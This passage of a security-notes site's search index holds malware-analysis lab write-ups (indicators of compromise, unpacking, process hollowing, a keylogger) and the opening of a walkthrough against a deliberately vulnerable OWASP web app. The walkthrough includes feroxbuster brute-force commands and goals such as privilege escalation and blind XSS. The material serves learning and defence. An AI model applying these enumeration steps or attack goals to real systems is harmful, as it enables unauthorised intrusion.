answer the questions below.</p>"},{"location":"Malware_Analysis/Practical_Malware_Analysis/Chapter%201/#questions","title":"Questions","text":""},{"location":"Malware_Analysis/Practical_Malware_Analysis/Chapter%201/#question-1","title":"Question 1.","text":"<p>Upload the files to http://www.VirusTotal.com/ and view the reports. Does either file match any existing antivirus signatures?</p> <ul> <li>Yes there are detections by various AV vendors.</li> </ul>"},{"location":"Malware_Analysis/Practical_Malware_Analysis/Chapter%201/#question-2","title":"Question 2.","text":"<p>When were these files compiled?</p> <ul> <li>Based on PEStudio, <code>Lab01-01.exe</code> was compiled on 19 Dec 2010 16:16:19 and <code>Lab01-01.dll</code> was compiled on 19 Dec 2010 16:16:38 </li> </ul>"},{"location":"Malware_Analysis/Practical_Malware_Analysis/Chapter%201/#question-3","title":"Question 3.","text":"<p>Are there any indications that either of these files is packed or obfuscated? If so, what are these indicators?</p> <ul> <li>Based on PEiD, the low Entropy as well as the imports being very obvious there are no signs of packing  </li> <li>Malware does not seem to be obfuscated as there is a lot of plain text around and entropy is low.</li> </ul>"},{"location":"Malware_Analysis/Practical_Malware_Analysis/Chapter%201/#question-4","title":"Question 4.","text":"<p>Do any imports hint at what this malware does? If so, which imports are they?</p> <ul> <li>Lab01-01.exe</li> </ul> Imports Function MapViewOfFile,CreateFileMappingA Loads File into ram and can be used to execute a file without using Windows Loader <ul> <li>Lab01-01.dll</li> </ul> Imports Function ws2_32.dll : socket, send, recv, inetaddr Using sockets to send and receive data CreateProcessA Creates a new process"},{"location":"Malware_Analysis/Practical_Malware_Analysis/Chapter%201/#question-5","title":"Question 5.","text":"<p>Are there any other files or host-based indicators that you could look for on infected systems?</p> <ul> <li>Based on the strings of <code>Lab01-01.exe</code> we can see that there is a particular file path <code>C:\\windows\\system32\\kerne132.dll</code>. <code>1</code> is used instead of <code>l</code> which might be indicative of a malicious <code>.dll</code> in that path. We could be able to find this <code>kerne132.dll</code> on the infected host.</li> </ul>"},{"location":"Malware_Analysis/Practical_Malware_Analysis/Chapter%201/#question-6","title":"Question 6.","text":"<p>What network-based indicators could be used to find this malware on infected machines?</p> <ul> <li>Based on the strings of <code>Lab01-01.dll</code>, we see what seems to be an IP address <code>127.26.152.13</code>. We could filter for this IP address when we look through the network logs.</li> </ul>"},{"location":"Malware_Analysis/Practical_Malware_Analysis/Chapter%201/#question-7","title":"Question 7.","text":"<p>What would you guess is the purpose of these files?</p> <ul> <li>It is likely that <code>Lab01-01.exe</code> is likely the loader and <code>Lab01-01.dll</code> likely contains the file malicious payload. </li> <li>One possibility is also that <code>Lab01-01.exe</code> is executed and it will change the name of <code>Lab01-01.dll</code> to <code>kernel132.dll</code> </li> <li>It might be a reverse shell/beacon as there are network connectivity imports in the <code>.dll</code> as well as a hardcoded IP address.</li> </ul>"},{"location":"Malware_Analysis/Practical_Malware_Analysis/Chapter%201/#screenshots","title":"Screenshots","text":"<ul> <li>Lab01-01.exe</li> </ul> Tool Evidence VirusTotal Classification Identify Packing/Obfuscation Imports Strings <ul> <li>Lab01-01.dll</li> </ul> Tool Evidence VirusTotal Classification Identify Packer/Obfuscation Imports Strings"},{"location":"Malware_Analysis/Practical_Malware_Analysis/Chapter%201/#lab-1-2","title":"Lab 1-2","text":"<p>Analyze the file Lab01-02.exe.</p>"},{"location":"Malware_Analysis/Practical_Malware_Analysis/Chapter%201/#questions_1","title":"Questions","text":""},{"location":"Malware_Analysis/Practical_Malware_Analysis/Chapter%201/#question-1_1","title":"Question 1.","text":"<p>Upload the Lab01-02.exe file to http://www.VirusTotal.com/. Does it match any existing antivirus definitions?</p> <ul> <li>Yes, there are detection by various AVs.</li> </ul>"},{"location":"Malware_Analysis/Practical_Malware_Analysis/Chapter%201/#question-2_1","title":"Question 2.","text":"<p>Are there any indications that this file is packed or obfuscated? If so, what are these indicators? If the file is packed, unpack it if possible.</p> <ul> <li>Packing is observed, due to the unusually small amount of imports and strings that does not make sense. </li> <li>It is packed by UPX. This can be seen using PEiD and the section headers when using CFF explorer or PEStudio.</li> <li>File can be unpacked using CFF explorer built-in UPX unpacker.</li> </ul>"},{"location":"Malware_Analysis/Practical_Malware_Analysis/Chapter%201/#question-3_1","title":"Question 3.","text":"<p>Do any imports hint at this program\u2019s functionality? If so, which imports are they and what do they tell you?</p> Import(s) Function CreateServiceA,  OpenSCManagerA Maintain Persistency by creating a service InternetOpenUrlA,  InternetOpenA Surfs a webpage"},{"location":"Malware_Analysis/Practical_Malware_Analysis/Chapter%201/#question-4_1","title":"Question 4.","text":"<p>What host- or network-based indicators could be used to identify this malware on infected machines?</p> <ul> <li>Based on the string we see a URL <code>www.malwareanalysisbook.com</code> and we can filter for this URL in network logs if it exists.</li> <li>As this malware could possibly create a service, <code>Malservice</code> could be a possible host based indicator. We can check Windows Event Logs with <code>EventViewer</code>, under <code>Windows Logs</code>&gt; <code>System</code> and look for events with the Source set to Service Control Manager (SCM).</li> <li>We can also look at <code>Applications and Services Logs</code> and look for malservice to see what it did.</li> </ul>"},{"location":"Malware_Analysis/Practical_Malware_Analysis/Chapter%201/#screenshots_1","title":"Screenshots","text":"<ul> <li>Packed Malware</li> </ul> Purpose Evidence VirusTotal Classification Identify Packing/Obfuscation Imports Strings <ul> <li>Unpacked Malware</li> </ul> Purpose Evidence VirusTotal Classfication Imports Strings"},{"location":"Malware_Analysis/Practical_Malware_Analysis/Chapter%201/#lab-1-3","title":"Lab 1-3","text":"<p>Analyze the file Lab01-03.exe.</p>"},{"location":"Malware_Analysis/Practical_Malware_Analysis/Chapter%201/#questions_2","title":"Questions","text":""},{"location":"Malware_Analysis/Practical_Malware_Analysis/Chapter%201/#question-1_2","title":"Question 1.","text":"<p>Upload the Lab01-03.exe file to http://www.VirusTotal.com/. Does it match any existing antivirus definitions?</p> <ul> <li>Yes there are detections by various AVs.</li> </ul>"},{"location":"Malware_Analysis/Practical_Malware_Analysis/Chapter%201/#question-2_2","title":"Question 2.","text":"<p>Are there any indications that this file is packed or obfuscated? If so, what are these indicators? If the file is packed, unpack it if possible.</p> <ul> <li>Yes although entropy level is low but imports only has 2 functions, the section headers are empty and the lack of strings indicate the possibility packing. </li> <li>PEiD, DiE and PEStudio all shows packing with signature <code>FSG 1.0</code> . </li> <li>#Unpacking Process is shown below.</li> </ul>"},{"location":"Malware_Analysis/Practical_Malware_Analysis/Chapter%201/#question-3_2","title":"Question 3.","text":"<p>Do any imports hint at this program\u2019s functionality? If so, which imports are they and what do they tell you?</p> <ul> <li>Lab01-03.exe</li> </ul> Import(s) Function <code>LoadLibraryA</code> <code>GetProcAddress</code> Used by packer <ul> <li>Lab01-03_extracted.exe</li> </ul> Import(s) Function"},{"location":"Malware_Analysis/Practical_Malware_Analysis/Chapter%201/#question-4_2","title":"Question 4.","text":"<p>What host- or network-based indicators could be used to identify this malware on infected machines?</p> <ul> <li>Indicators of Compromise</li> </ul> Type Indicator Network <code>http://malwareanalysisbook.com/ad.html</code>"},{"location":"Malware_Analysis/Practical_Malware_Analysis/Chapter%201/#screenshots_2","title":"Screenshots","text":"<ul> <li>Packed </li> </ul> Purpose Evidence VirusTotal Classfication Identify Packer/Obfuscation Imports Strings <ul> <li>Unpacked</li> </ul> Purpose Evidence VirusTotal Classfication Imports Strings"},{"location":"Malware_Analysis/Practical_Malware_Analysis/Chapter%201/#unpacking-process","title":"Unpacking Process","text":"<ul> <li>As this is packed using FSG 1.0 which is well known, there are x96dbg scripts already  available here and here.</li> </ul> Steps Screenshots Step 1  Go to the script tab Step 2  Load the script Step 3  Run the script by hitting <code>spacebar</code>  As we can see on the right, Script was ran successfully and <code>OEP</code> is found Step 4  Run the Scylla Plugin Step 5  As can be seen on the left we do an initial dump of the unpacked executable Step 6  Do an IAT Autosearch  The IAT info fields will be filled when autosearch is successful. Step 7  Get the imports to see if there are any broken imports Step 8  Lastly, make sure the imports are all good and fix the unpacked PE dump"},{"location":"Malware_Analysis/Practical_Malware_Analysis/Chapter%201/#lab-1-4","title":"Lab 1-4","text":"<p>Analyze the file Lab01-04.exe.</p>"},{"location":"Malware_Analysis/Practical_Malware_Analysis/Chapter%201/#questions_3","title":"Questions","text":""},{"location":"Malware_Analysis/Practical_Malware_Analysis/Chapter%201/#question-1_3","title":"Question 1.","text":"<p>Upload the Lab01-04.exe file to http://www.VirusTotal.com/. Does it match any existing antivirus definitions?</p> <ul> <li>Yes, it was flagged as malicious by VirusTotal</li> </ul>"},{"location":"Malware_Analysis/Practical_Malware_Analysis/Chapter%201/#question-2_3","title":"Question 2.","text":"<p>Are there any indications that this file is packed or obfuscated? If so, what are these indicators? If the file is packed, unpack it if possible.</p> <ul> <li>There are visible strings, imports and sections are normal and entropy is low thus suggesting that sample is not packed and not obfuscated.</li> </ul>"},{"location":"Malware_Analysis/Practical_Malware_Analysis/Chapter%201/#question-3_3","title":"Question 3.","text":"<p>When was this program compiled?</p> Binary Compile Time Lab01-04.exe Fri Aug 30 22:26:59 2019 UTC Extracted Binary Sun Feb 27 00:16:59 2011 UTC"},{"location":"Malware_Analysis/Practical_Malware_Analysis/Chapter%201/#question-4_3","title":"Question 4.","text":"<p>Do any imports hint at this program\u2019s functionality? If so, which imports are they and what do they tell you?</p> <ul> <li>Lab01-04.exe</li> </ul> Imports Function <code>CreateRemoteThread</code> <code>LoadLibraryA</code> Dll Injection <code>OpenProcessToken</code> <code>AdjustTokenPrivileges</code> <code>GetModuleHandle</code> <code>LookupPrivilegeValue</code> Token Impersonation <code>OpenProcess</code>, <code>GetProcAddress</code> Process Creation <code>MoveFileA</code>, <code>CreateFileA</code>, <code>GetWindowsDirectory</code> File creation and modification <ul> <li>Extracted Binary File</li> </ul> Import Function <code>WinExec</code> Execute File <code>URLDownloadToFileA</code> Downloading from C2"},{"location":"Malware_Analysis/Practical_Malware_Analysis/Chapter%201/#question-5_1","title":"Question 5.","text":"<p>What host- or network-based indicators could be used to identify this malware on infected machines?</p> <ul> <li>Indicators of Compromise</li> </ul> Type Indicator Host <code>\\system32\\wupdmgr.exe</code> <code>\\winup.exe</code> Host winlogon.exe Network <code>http://www.practimalwareanalysis.com/updater.exe</code> <ul> <li>Based on the host based indicators above, we can likely check host for file with the name of <code>wupdmgr.exe</code> in the <code>system32</code> directory and for <code>winup.exe</code>. We can likely compare the hashes of these files with the hashes we obtained above.</li> <li>It is likely, that there is a process creation going on, and the process targeted coule be <code>winlogon.exe</code></li> <li>Lastly, a connection is likely to be made to <code>http://practicalmalwareanalysis.com/updater.exe</code> to download <code>updater.exe</code> which would be executed by the malware.</li> </ul>"},{"location":"Malware_Analysis/Practical_Malware_Analysis/Chapter%201/#question-6_1","title":"Question 6.","text":"<p>This file has one resource in the resource section. Use Resource Hacker to examine that resource, and then use it to extract the resource. What can you learn from the resource?</p> <ul> <li>Within the executable's resource there is another executable.</li> <li>This is likely a two stage malware. <code>Lab01-04.exe</code> is likely used to load the binary that is in the resource.</li> <li>The binary within <code>Lab01-04.exe</code> is likely a downloader that downloads from URL <code>http://www.practicalmalwareanalysis.com/updater.exe</code></li> </ul>"},{"location":"Malware_Analysis/Practical_Malware_Analysis/Chapter%201/#screenshots_3","title":"Screenshots","text":"<ul> <li>Lab01-04.exe</li> </ul> Purpose Evidence VirusTotal link Classfication Imports Strings Resources <ul> <li>Extracted Binary File</li> </ul> Purpose Evidence VirusTotal link Classfication Imports Strings"},{"location":"Malware_Analysis/Practical_Malware_Analysis/Chapter%203/","title":"Chapter 3","text":""},{"location":"Malware_Analysis/Practical_Malware_Analysis/Chapter%203/#lab-3-1","title":"Lab 3-1","text":"<p>Analyze the malware found in the file Lab03-01.exe using basic dynamic analy- sis tools.</p>"},{"location":"Malware_Analysis/Practical_Malware_Analysis/Chapter%203/#analysis","title":"Analysis","text":"<ul> <li>As can be seen at the #Windows 10 Machine, doing dynamic analysis of the sample on a windows10 machine will result in the process <code>werfault.exe</code> to be generated. <code>werfault.exe</code> is a fault reporting mechanism of Windows 10. </li> <li>Tested compatibility mode in two profiles Windows 7 and Windows XP and it will not work as well.  </li> <li>Addtionally, with reference to this articleand this too, this sample will not be able to run with Windows 10.  </li> <li>It seems like malware will only be able to run when a genuine Windows XP machine is used.</li> <li>So we booted a #Windows XP Machine to detonate the malware and it worked!</li> <li>From the ProcDot results below, we can see that <code>Lab03-01.exe</code> will create a new file <code>vmx32to64.exe</code> in <code>system32</code> folder and add a new registry in <code>HLKM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\VideoDriver</code> to automatically start <code>vmx32to64.exe</code> on startup.</li> <li>Additionally, Lab03-01.exe will also attempt to connect to <code>www.practicalmalwareanalysis.com</code></li> </ul>"},{"location":"Malware_Analysis/Practical_Malware_Analysis/Chapter%203/#indicators-of-compromise","title":"Indicators of Compromise","text":"Indicator Indicator Type Value Hash (SHA1) Host <code>0BB491F62B77DF737801B9AB0FD14FA12D43D254</code> File Created Host <code>Lab03-01.exe</code> <code>WINDOWS\\system32\\vmx32to64.exe</code> Registry Host <code>HLKM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\VideoDriver</code> URL Strings Network www.practicalmalwareanalysis.com"},{"location":"Malware_Analysis/Practical_Malware_Analysis/Chapter%203/#screenshots","title":"Screenshots","text":""},{"location":"Malware_Analysis/Practical_Malware_Analysis/Chapter%203/#lab03-01-basic-static-analysis","title":"Lab03-01 Basic Static Analysis","text":"<ul> <li>Lab03-01.exe &amp; vm32to64.exe</li> </ul> Information Screenshot Classification Identifying Obfuscation &amp; Packing Imports Strings"},{"location":"Malware_Analysis/Practical_Malware_Analysis/Chapter%203/#lab03-01-basic-dynamic-analysis","title":"Lab03-01 Basic Dynamic Analysis","text":""},{"location":"Malware_Analysis/Practical_Malware_Analysis/Chapter%203/#windows-10-machine","title":"Windows 10 Machine","text":""},{"location":"Malware_Analysis/Practical_Malware_Analysis/Chapter%203/#windows-xp-machine","title":"Windows XP Machine","text":"<ul> <li>Lab03-01.exe</li> </ul> Tools Screenshot ProcDot Proc Exp (Strings) Proc Exp Wireshark <ul> <li>vmx32to64.exe</li> </ul> Tools Screenshots ProcDot Proc Exp(Strings) Proc Exp RegEdit"},{"location":"Malware_Analysis/Practical_Malware_Analysis/Chapter%203/#lab-3-2","title":"Lab 3-2","text":"<p>Analyze the malware found in the file Lab03-02.dll using basic dynamic analysis tools.</p>"},{"location":"Malware_Analysis/Practical_Malware_Analysis/Chapter%203/#questions","title":"Questions","text":""},{"location":"Malware_Analysis/Practical_Malware_Analysis/Chapter%203/#question-4","title":"Question 4.","text":"<p>Which filters could you set in order to use procmon to glean information?</p>"},{"location":"Malware_Analysis/Practical_Malware_Analysis/Chapter%203/#analysis_1","title":"Analysis","text":"<ul> <li>This is a <code>.dll</code>, hence we will need to use <code>rundll32.exe</code> to run it. Based on this [[Windows Internals#run32dll exe|guide]], to run a dll file with rundll32.exe, we will need to know what is exported and call the exported functions.</li> <li>Based on the exports, we find that there are 5 functions <code>Install</code>, <code>installA</code>, <code>ServiceMain</code>, <code>UninstallA</code>, <code>Uninstall</code>.</li> <li>Based on the #Lab 3-2 Reverse Engineering code, we can see that <code>installA</code> will call <code>Install</code> which will install a service <code>IPRIP</code> onto the computer.</li> <li>This is further confirmed by our dynamic analysis where we ran the malicious DLL and observed the changes in the registry. </li> <li>After running the installation we will need to start the malicious service that is created to complete the execution of the malware. </li> <li>This can be done by running the command <code>net start IPRIP</code>.</li> <li>When a service is started, a <code>svchost.exe</code> proces will be started and hence we can look for the malicious service by sifting through all the <code>svchost.exe</code> processes and look for one that loads <code>Lab03-02.dll</code>.</li> <li>With the <code>PID</code> gathered using ProcExp and filter for the particular PID.   </li> </ul>"},{"location":"Malware_Analysis/Practical_Malware_Analysis/Chapter%203/#indicators-of-compromise_1","title":"Indicators of Compromise","text":"Indicator Indicator Type Value Hash (SHA1) Host C6FB3B50D946BEC6F391AEFA4E54478CF8607211 Registry Host Various new registry keys in <code>HKLM\\System\\CurrentControlSet\\Services\\IPRIP</code> URL Strings Network www.practicalmalwareanalysis.com HTTP Traffic Network"},{"location":"Malware_Analysis/Practical_Malware_Analysis/Chapter%203/#screenshots_1","title":"Screenshots","text":""},{"location":"Malware_Analysis/Practical_Malware_Analysis/Chapter%203/#lab-3-2-basic-static-analysis","title":"Lab 3-2 Basic Static Analysis","text":"Information Screenshot Classification Identifying Obfuscation &amp; Packing Exports Imports Strings"},{"location":"Malware_Analysis/Practical_Malware_Analysis/Chapter%203/#lab-3-2-reverse-engineering","title":"Lab 3-2 Reverse Engineering","text":"Description Screenshot installA Install uninstallA UninstallService"},{"location":"Malware_Analysis/Practical_Malware_Analysis/Chapter%203/#lab-3-2-basic-dynamic-analysis","title":"Lab 3-2 Basic Dynamic Analysis","text":""},{"location":"Malware_Analysis/Practical_Malware_Analysis/Chapter%203/#dll-execution-overview","title":"DLL Execution Overview","text":"<ul> <li>Failed Run</li> </ul> Tool Screenshot ProcDot <ul> <li>Successful Execution</li> </ul> Tool Screenshot ProcDot RegEdit Autoruns"},{"location":"Malware_Analysis/Practical_Malware_Analysis/Chapter%203/#starting-malicious-service","title":"Starting Malicious Service","text":"Tool Screenshot ProcExp ProcDot apateDNS HTTP Traffic"},{"location":"Malware_Analysis/Practical_Malware_Analysis/Chapter%203/#lab-3-3","title":"Lab 3-3","text":"<p>Execute the malware found in the file Lab03-03.exe while monitoring it using basic dynamic analysis tools in a safe environment.</p>"},{"location":"Malware_Analysis/Practical_Malware_Analysis/Chapter%203/#analysis_2","title":"Analysis","text":"<ul> <li>From our analysis, we can conclude that Lab03-03.exe is a loader that creates a <code>svchost.exe</code> process and injecting in memory into the process a keylogger.</li> </ul>"},{"location":"Malware_Analysis/Practical_Malware_Analysis/Chapter%203/#basic-static-analysis","title":"Basic Static Analysis","text":"<ul> <li>From basic static analysis we can see that there is no signs of packing and obfuscation and some function imports and strings i.e <code>SetThreadContext</code>, <code>WriteProcessMemory</code>, <code>NtUnmapViewOfSection</code> that suggests that there is process hollowing going on. </li> <li>We can also see that there is a resource named <code>LOCALIZATION</code></li> </ul>"},{"location":"Malware_Analysis/Practical_Malware_Analysis/Chapter%203/#dynamic-analysis","title":"Dynamic Analysis","text":"<ul> <li>Doing #Lab 3-3 Basic Dynamic Analysis we notice in ProcDot that <code>Lab03-03.exe</code> opens a <code>svchost.exe</code> process then kills itself. This <code>svchost.exe</code> process then writes into a file <code>practicalmalwareanalysis.log</code> and is still alive. This is a sign of process hollowing.</li> <li>We open the file created to see that it is a keystroke log.</li> <li>From process explorer we can see that there is a difference in strings of the image as compared to the strings of the memory of the <code>svchost.exe</code> process.</li> <li>From the memory strings we can see strings that were not discovered during basic static analysis i.e <code>UnhookWindowsHookEx</code>, <code>SetWindowsHookExA</code> which are all imports that points to key logging.</li> </ul>"},{"location":"Malware_Analysis/Practical_Malware_Analysis/Chapter%203/#reverse-engineering","title":"Reverse Engineering","text":"<ul> <li>The reverse engineering confirms that there is process hollowing as the code pattern resembles the one explained here</li> <li>Addtionally, we can see that there is a function that loads the resource <code>LOCALIZATION</code> and decodes the resource. As we can see from the decode function, <code>XOR</code> encoding was used.  </li> <li>Resource was extracted with resource hacker and decoded with cyberchef and we can see that there is <code>MZ</code> and <code>This program cannot be run in DOS mode.</code> which is the header for executables.</li> <li>We then did some basic static analysis and we can see that there are some function imports that resembles the strings that are captured from memory.</li> <li>Reverse Engineering of <code>LOCALIZATION_decoded.bin</code> we find a keyloggin function.</li> </ul>"},{"location":"Malware_Analysis/Practical_Malware_Analysis/Chapter%203/#indicators-of-compromise_2","title":"Indicators of Compromise","text":"Indicator Indicator Type Value Hash (SHA1) Host DAF263702F11DC0430D30F9BF443E7885CF91FCB File Created Host practicalmalwareanalysis.log"},{"location":"Malware_Analysis/Practical_Malware_Analysis/Chapter%203/#screenshots_2","title":"Screenshots","text":""},{"location":"Malware_Analysis/Practical_Malware_Analysis/Chapter%203/#lab-3-3-basic-static-analysis","title":"Lab 3-3 Basic Static Analysis","text":""},{"location":"Malware_Analysis/Practical_Malware_Analysis/Chapter%203/#lab03-03exe","title":"Lab03-03.exe","text":"Information Screenshot Classification Identifying Obfuscation &amp; Packing Imports Strings Resource"},{"location":"Malware_Analysis/Practical_Malware_Analysis/Chapter%203/#localization_decodedbin","title":"LOCALIZATION_decoded.bin","text":"Information Screenshot Classification Imports Strings"},{"location":"Malware_Analysis/Practical_Malware_Analysis/Chapter%203/#lab-3-3-reverse-engineering","title":"Lab 3-3 Reverse Engineering","text":""},{"location":"Malware_Analysis/Practical_Malware_Analysis/Chapter%203/#lab03-03exe_1","title":"Lab03-03.exe","text":"Functions Screenshots Process Hollowing Loading Resource Decoding Resource Decoded Resource"},{"location":"Malware_Analysis/Practical_Malware_Analysis/Chapter%203/#localization_decodedbin_1","title":"LOCALIZATION_decoded.bin","text":"Function Screenshots KeyLogging"},{"location":"Malware_Analysis/Practical_Malware_Analysis/Chapter%203/#lab-3-3-basic-dynamic-analysis","title":"Lab 3-3 Basic Dynamic Analysis","text":"Tool Screenshot ProcDot ProcExp File Created : practicalmalwareanalysis.log"},{"location":"Malware_Analysis/Practical_Malware_Analysis/Chapter%203/#lab-3-4","title":"Lab 3-4","text":"<p>Analyze the malware found in the file Lab03-04.exe using basic dynamic analysis tools. (This program is analyzed further in the Chapter 9 labs.)</p>"},{"location":"Malware_Analysis/Practical_Malware_Analysis/Chapter%203/#analysis_3","title":"Analysis","text":"<ul> <li>Application quits and deletes itself preventing further analysis. Reverse engineering found that the application checks for several conditions before it executes and if some conditions are available it will terminate it's process and delete itself.</li> <li>Hence we will need to patch the executable by changing the code flow in the debugger so that it bypasses this checking. </li> </ul>"},{"location":"Malware_Analysis/Practical_Malware_Analysis/Chapter%203/#basic-static-analysis_1","title":"Basic Static Analysis","text":"<ul> <li>From #Lab 3-4 Basic Static Analysis we can see that there is no packing used and there does not seem to be any obfuscation.</li> </ul>"},{"location":"Malware_Analysis/Practical_Malware_Analysis/Chapter%203/#dynamic-analysis_1","title":"Dynamic Analysis","text":"<ul> <li>From ProcDot, we can see that the applicatin will run set a few registries in the <code>HKCU</code> and deletes itself.</li> <li>No network connection was made even though there were imports and strings which suggests that this malware has such capabilities. </li> <li>Likely, malware terminates itself after realising that it is in an unfavorable environment.</li> </ul>"},{"location":"Malware_Analysis/Practical_Malware_Analysis/Chapter%203/#reverse-engineering_1","title":"Reverse Engineering","text":"<ul> <li>Based on reverse engineering we found a function that will look for the executable file, delete the executable file and terminate the malicious process. </li> <li>We also found that there are 7 instances of the function being called. </li> <li>These 7 instances are all within one function which does certain checks.</li> <li>This function is then called by the <code>entry</code> function </li> </ul>"},{"location":"Malware_Analysis/Practical_Malware_Analysis/Chapter%203/#indicators-of-compromise_3","title":"Indicators of Compromise","text":"Indicator Indicator Type Value Hash (SHA1) Host D6356B2C6F8D29F8626062B5AEFB13B7FC744D54 Registry Host URL Strings Network www.practicalmalwareanalysis.com"},{"location":"Malware_Analysis/Practical_Malware_Analysis/Chapter%203/#screenshots_3","title":"Screenshots","text":""},{"location":"Malware_Analysis/Practical_Malware_Analysis/Chapter%203/#lab-3-4-basic-static-analysis","title":"Lab 3-4 Basic Static Analysis","text":"Information Screenshot Classification Identifying Obfuscation &amp; Packing Imports Strings"},{"location":"Malware_Analysis/Practical_Malware_Analysis/Chapter%203/#lab-3-4-basic-dynamic-analysis","title":"Lab 3-4 Basic Dynamic Analysis","text":"Tool Screenshot ProcDot"},{"location":"Malware_Analysis/Practical_Malware_Analysis/Chapter%203/#lab-3-4-reverse-engineering","title":"Lab 3-4 Reverse Engineering","text":"Function Screenshot delete self and terminate process function call delete and terminate function entry"},{"location":"OWASP_Labs/Generic%20University/","title":"Generic University","text":"<p>Generic University is a \"Under Construction\" vulnerable web application for student of generic university to see their grades online. This project can be found under OWASP Vulnerable Web Applications DIrectory. It contains some of the vulnerabilities found in OWASP API Top 10 2019 and with very clear goals.</p> <p>My Personal Objective in this undertaking would be to go through my workflow to refine the enumeration steps. The enumeration done here will be focused on Application Profiling. Next objective will be to find all the vulnerabilities that is in the author's goals. A good reference would be the docker image creator -  busk3r's own writeup. </p>"},{"location":"OWASP_Labs/Generic%20University/#authors-goals","title":"Author's Goals","text":"S/N Goals Answer 1 Find the emails of the administrator #Find Administrator Emails 2 Brute force the API to find new endpoints #Discover Hidden Content 3 Find out what grades everyone got in a class #Find Everyone's Grades 4 Edit someone's grade #Edit Someone's Grades 5 Make an account #Registering an account 6 Access the GraphQL API #Graphql Enumeration 7 Change another account's password #Change Another Account's Password 8 Login to your account #Exploring with a Registered Account 9 Access admin API #Make a user account Admin 10 Find out what vulnerabilities the IT admins have ignored #Exploring with a Registered Account 11 Make your account an admin #Make a user account Admin 12 Access the admin control panel #Exploring with a Registered Account 13 Fire a blind XSS in the admin control panel and validate with your new admin account #XSS on vulnerable forms 14 Delete everything #Make a user account Admin 15 Restore everything #Make a user account Admin"},{"location":"OWASP_Labs/Generic%20University/#2a-mapping-application-content","title":"2a. Mapping Application Content","text":""},{"location":"OWASP_Labs/Generic%20University/#explore-visible-content","title":"Explore Visible Content","text":""},{"location":"OWASP_Labs/Generic%20University/#initial-exploration","title":"Initial Exploration","text":"<ul> <li>We do an initial exploration by setting up burp and exploring the visible web pages with burp proxy and passive crawling turned on. In the table are that of the visible content visited.</li> </ul> Screenshots Screenshots <ul> <li>The following sitemap is obtained.</li> </ul> <ul> <li>From the sitemap above, we can see that </li> <li>We then use Engagement tools : \"Find Scripts\", \"Find Reference\", \"Find Comments\"</li> </ul> Tools Results Find Script Find Comments No interesting comments Find References <ul> <li> <p>From the results extracted above, we can see that there are a few interesting links we can visit or enumerate further.</p> </li> <li> <p>Additionally, an interesting finding at this stage is <code>/api/users/6</code>.</p> </li> </ul> <p></p> <ul> <li> <p>As highlighted above, the <code>GET</code> request sent makes use of XMLHttpRequest to send to an API endpoint to get the user with <code>id</code> 6. </p> </li> <li> <p>We hit a \"dead end\" for exploring visible content here and we will move on to the other kinds of enumeration - #Discover Hidden Content, #Discover Default Content, #Consult Public Resources</p> </li> </ul>"},{"location":"OWASP_Labs/Generic%20University/#further-exploration","title":"Further Exploration","text":"<ul> <li>With results from the enumeration from #Discover Hidden Content, #Discover Default Content, we are back to exploring the application further.</li> </ul> Further Findings Screenshot /register .htaccess /web.config /api/users /api/roles /api/classes <ul> <li>We use the findings above to further explore visible content. This is done by #Registering an account and subsequently #Exploring with a Registered Account.</li> </ul>"},{"location":"OWASP_Labs/Generic%20University/#registering-an-account","title":"Registering an account","text":"<ul> <li>We use the <code>/register</code> function to register an account and after registration we are   </li> </ul>"},{"location":"OWASP_Labs/Generic%20University/#exploring-with-a-registered-account","title":"Exploring with a Registered Account","text":"<ul> <li>With registered account we continue out enumeration. When we enumerated the API endpoints below we noticed that <code>/api/user</code> and <code>/api/admin</code>is redirected to login page. Hence we will attempt to find out more about the API endpoints with this registered account. </li> <li>As can be seen below, <code>/api/admin</code> gave us the admin API endpoints.</li> </ul> <ul> <li>However, we are unable to use the API endpoints as we did not have the required permissions.</li> </ul> <ul> <li>In our directory busting below, we also had a redirect when <code>/admin</code> directory was involved. Hence we will attempt to browse that page.</li> </ul> <ul> <li>We attempt to see if we can acces \"Security Vulnerabilities\" link and it seems like with a student account, we are able to see the security vulnerabilities.</li> </ul>"},{"location":"OWASP_Labs/Generic%20University/#consult-public-resources","title":"Consult Public Resources","text":"<ul> <li>One of the enumeration steps involved is consulting public resources and hence with this we go to the github of the author to look for some clues. Indeed, we get to know that there should be at least 4 api endpoints and based on what we found, it is possible that we are missing out on one of the endpoints and that is 'grades'.</li> </ul>"},{"location":"OWASP_Labs/Generic%20University/#discover-hidden-content","title":"Discover Hidden Content","text":"<ul> <li>Next up we will be doing directory enumeration using feroxbuster. We did not use \"Discover Content\" it might pollute the sitemap result with it's recursive function. Somehow feroxbuster is faster too.</li> </ul>"},{"location":"OWASP_Labs/Generic%20University/#initial-discovery","title":"Initial Discovery","text":""},{"location":"OWASP_Labs/Generic%20University/#using-commontxt","title":"Using common.txt","text":"<pre><code>feroxbuster -u &lt;url&gt; -w /usr/share/wordlists/dirb/common.txt -o out.txt\n</code></pre> <ul> <li>Discovering APIs endpoints</li> </ul> <pre><code>feroxbuster -u &lt;url&gt;/api -w /usr/share/wordlists/dirb/common.txt -o api.txt\n</code></pre> <ul> <li>Attempted <code>/js</code>, <code>/css</code>, <code>/image</code> discovery. As can be seen below, nothing was found.</li> </ul> Extension Results <code>/js</code> <code>/css</code> <code>/image</code>"},{"location":"OWASP_Labs/Generic%20University/#using-a-api-specific-wordlist","title":"Using a API Specific Wordlist","text":"<ul> <li>We enumerated the <code>/api</code> and <code>/images</code> extension further with a wordlist that is collated by <code>chrislockard</code>.</li> </ul> <ul> <li>From the result above, we can see that for the API endpoints enumerated are the same with the one enumerated with <code>common.txt</code>.</li> </ul>"},{"location":"OWASP_Labs/Generic%20University/#using-graphql-specific-wordlist","title":"Using GraphQL specific wordlist","text":"<ul> <li>From the above, we can see that graphQL is used and graphIQL(Introspection) is enabled. </li> </ul>"},{"location":"OWASP_Labs/Generic%20University/#discover-default-content","title":"Discover Default Content","text":""},{"location":"OWASP_Labs/Generic%20University/#nikto","title":"Nikto","text":"<ul> <li>Using Nikto Scan on webserver</li> </ul> <ul> <li>Using <code>-root</code> scan to scan other directories that we have enumerated.</li> </ul> <ul> <li>From the above result we see some interesting vulnerabilities being flagged like te <code>/api/users</code> being flagged as something interesting and <code>/admin</code> flagged with OSVDB-630.</li> </ul>"},{"location":"OWASP_Labs/Generic%20University/#test-for-debug-parameters","title":"Test for Debug Parameters","text":"<ul> <li>From the response above, it seems like debug mode is on.</li> </ul>"},{"location":"OWASP_Labs/Generic%20University/#graphql-enumeration","title":"Graphql 